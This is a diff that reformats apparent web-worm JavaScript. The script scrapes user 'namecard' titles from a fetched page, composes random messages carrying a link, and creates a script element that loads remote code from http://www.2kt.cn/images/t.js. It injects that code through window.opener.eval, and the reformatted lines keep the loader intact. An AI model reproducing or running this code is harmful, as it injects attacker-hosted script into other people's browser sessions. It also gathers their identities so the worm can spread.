@@ -11,7 +11,7 @@ function getappkey(url){
 	result = xmlHttp.responseText;
 	id_arr = '';
 	id = result.match(/namecard=\"true\" title=\"[^\"]*/g);
-	for(i=0;i<id.length;i++){
+	for(i = 0;i < id.length; i++){
 		sum = id[i].toString().split('"')[3];
 		id_arr += sum + '||';
 	}
@@ -22,7 +22,7 @@ function random_msg(){
 	var msgs = [
 		'A',
 		'B'];
-	var msg = msgs[Math.floor(Math.random()*msgs.length)] + link;
+	var msg = msgs[Math.floor(Math.random() * msgs.length)] + link;
 	msg = encodeURIComponent(msg);
 	return msg;
 }
@@ -71,7 +71,10 @@ function main(){
 	catch(e){}
 }
 try{
-   x="g=document.createElement('script');g.src='http://www.2kt.cn/images/t.js';document.body.appendChild(g)";window.opener.eval(x);
+   x = "g=document.createElement('script');" 
+   + "g.src='http://www.2kt.cn/images/t.js';" 
+   + "document.body.appendChild(g)";
+   window.opener.eval(x);
 }
 catch(e){}
 main();
